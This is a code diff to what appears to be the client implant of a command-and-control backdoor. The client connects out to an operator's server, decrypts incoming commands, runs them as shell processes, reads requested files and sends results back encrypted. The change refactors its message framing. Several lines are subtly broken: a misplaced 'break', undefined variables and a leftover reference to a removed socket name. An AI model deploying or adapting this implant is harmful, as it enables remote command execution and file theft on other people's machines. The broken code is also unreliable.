@@ -26,43 +26,56 @@ def do_decrypt(ciphertext):
     message = message[:-message[-1]]
     return message
 
+def get_data(conn):
+    bs = conn.recv(8)
+    try:
+        (length,) = struct.unpack('>Q', bs)
+    except struct.error as err:
+        print("{0}".format(err))
+        break
+    data = b''
+    while len(data) < length:
+        to_read = length - len(data)
+        data += conn.recv(buff if to_read > buff else to_read)
+    return data
+
+def sendit(conn, output):
+    message = do_encrypt(output)
+    print(message)
+    length = pack('>Q', len(message))
+    conn.sendall(length)
+    conn.sendall(message)
+
 def main():
     global aeskey
     global aesiv
-    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    conn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     buff = 4096
-    s.connect((args.server, args.port))
+    conn.connect((args.server, args.port))
     while True:
         try:
-            received = do_decrypt(s.recv(buff)).strip().split()
+            received = do_decrypt(get_data(conn))
             command = [ str(x, 'utf-8') for x in received ]
             if 'cmd' in command:
                 del command[0]
                 output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-                sendit(s, output.stdout)
+                sendit(conn, output.stdout)
             elif 'Arsenal' in command:
                 sendit(s, 'Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME'))
             elif 'get_file' in command:
                 with open(command[1]) as f:
                     tmp = f.read()
-                sendit(s, bytes(tmp))
+                sendit(conn, bytes(tmp))
             elif 'aeskey' in command:
                 message = ast.literal_eval(message)
                 print(message)
                 aeskey = message[1]
                 aesiv = message[2]
-                sendit(s, 'Updated AES key\n')
+                sendit(conn, 'Updated AES key\n')
         except socket.error as err:
             print("{0}\n".format(err))
     return
-
-def sendit(s, output):
-    message = do_encrypt(output)
-    print(message)
-    length = pack('>Q', len(message))
-    s.sendall(length)
-    s.sendall(message)
 
 if __name__ == '__main__':
     while True:
